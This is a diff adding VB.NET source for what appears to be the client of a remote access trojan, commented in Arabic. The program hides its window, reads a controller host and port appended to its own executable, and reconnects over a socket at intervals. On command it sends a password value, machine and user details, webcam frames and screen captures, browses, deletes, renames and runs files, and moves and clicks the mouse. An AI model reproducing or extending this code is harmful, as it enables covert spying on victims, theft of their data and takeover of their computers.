@@ -1,0 +1,141 @@
+﻿Imports System.Globalization ' الفضاء الذي سساعدنا على جلب اسم الدوله
+Imports System.IO
+Public Class Form1
+    Public cap As New CRDP
+    Dim yy As String = "||"
+    Public WithEvents c As New SocketClient 'تعريف متغير من السوكت
+    Private culture As String = CultureInfo.CurrentCulture.EnglishName
+    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1) ' متغير محفوظ فيه اسم الدوله
+    Dim host As String = "127.0.0.1" ' الهوست او الاي بي
+    Dim port As Integer = 92 'البورت
+    Dim alaa(), text1, text2 As String
+    Const spl As String = "abccba"
+    Dim pw As String
+    Public cam As New cam.A
+
+
+    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
+        End
+
+    End Sub
+
+    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
+        text1 = Space(LOF(1))
+        text2 = Space(LOF(1))
+        FileGet(1, text1)
+        FileGet(1, text2)
+        FileClose()
+        alaa = Split(text1, spl)
+        host = alaa(1)
+        port = alaa(2)
+
+        'اخفاء الفورم
+        Me.ShowInTaskbar = False
+        Me.Hide()
+        Me.Visible = False
+        'بدأ  الاتصال
+        Timer1.Start()
+        Dim pw As String
+        pw = A.GT
+
+    End Sub
+    Private Sub data(ByVal b As Byte()) Handles c.Data
+        Dim ala As String() = Split(BS(b), "||") ' اريه من نوع سترينغ تقسم البانات القادمه اعتمادا على "||"
+        'جمله شرطيه بالاعتماد على اول كلمه يرسلها الكلاينت
+
+        Select Case ala(0)
+            Case "openpw"
+                c.Send("openpw")
+            Case "getpw"
+                c.Send("getpw" & "||" & pw)
+
+
+
+
+
+            Case "info"
+
+                c.Send("info" & "||" & "myID" & "||" & Environment.MachineName & "/" & Environment.UserName & "||" & My.Computer.Info.OSFullName & "||" & country & "||" & getanti())
+            Case "camlist"
+                Dim s As String = "camlist"
+                For Each x As String In cam.Divs
+                    s &= "||" & x
+                Next
+                c.Send(s)
+            Case "cam"
+                Dim s As String = "cam"
+                If cam.Drive <> ala(1) Then
+                    cam.onn(ala(1), New Size(160, 120))
+                    c.Send(s)
+                Else
+                    If cam.M IsNot Nothing Then
+                        Dim m = cam.M.Clone
+                        Dim cc As New ImageConverter
+                        Dim bb As Byte() = cc.ConvertTo(m, b.GetType)
+                        c.Send(s & "||" & Convert.ToBase64String(bb))
+                    Else
+                        c.Send(s)
+                    End If
+                End If
+            Case "camclose"
+                cam.close()
+            Case "GetDrives"
+                c.Send("FileManager" & "||" & getDrives())
+            Case "FileManager"
+                Try
+                    c.Send("FileManager" & "||" & getFolders(ala(1)) & getFiles(ala(1)))
+                Catch
+                    c.Send("FileManager" & "||" & "Error")
+                End Try
+
+            Case "Delete"
+                Select Case alaa(1)
+                    Case "Folder"
+                        IO.Directory.Delete(ala(2))
+                    Case "File"
+                        IO.File.Delete(ala(2))
+                End Select
+            Case "Execute"
+                Process.Start(ala(1))
+            Case "Rename"
+                Select Case ala(1)
+                    Case "Folder"
+                        My.Computer.FileSystem.RenameDirectory(ala(2), ala(3))
+                    Case "File"
+                        My.Computer.FileSystem.RenameFile(ala(2), ala(3))
+                End Select
+            Case "openfm"
+                c.Send("openfm")
+            Case "!" ' server ask for my screen Size
+                cap.Clear()
+                Dim s = Screen.PrimaryScreen.Bounds.Size
+                c.Send("!" & yy & s.Width & yy & s.Height)
+            Case "@" ' Start Capture
+                Dim SizeOfimage As Integer = ala(1)
+                Dim Split As Integer = ala(2)
+                Dim Quality As Integer = ala(3)
+
+                Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
+                Dim M As New IO.MemoryStream
+                Dim CMD As String = "@" & yy
+                M.Write(SB(CMD), 0, CMD.Length)
+                M.Write(Bb, 0, Bb.Length)
+                c.Send(M.ToArray)
+                M.Dispose()
+            Case "#" ' mouse clicks
+                Cursor.Position = New Point(ala(1), ala(2))
+                mouse_event(ala(3), 0, 0, 0, 1)
+            Case "$" '  mouse move
+                Cursor.Position = New Point(ala(1), ala(2))
+
+        End Select
+
+    End Sub
+    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
+        'جمله شرطيه تفيد اذا لم يكن السيرفر متصل فعاود الاتصال
+        If c.Statconnected = False Then
+            c.Connect(host, port)
+        End If
+    End Sub
+End Class
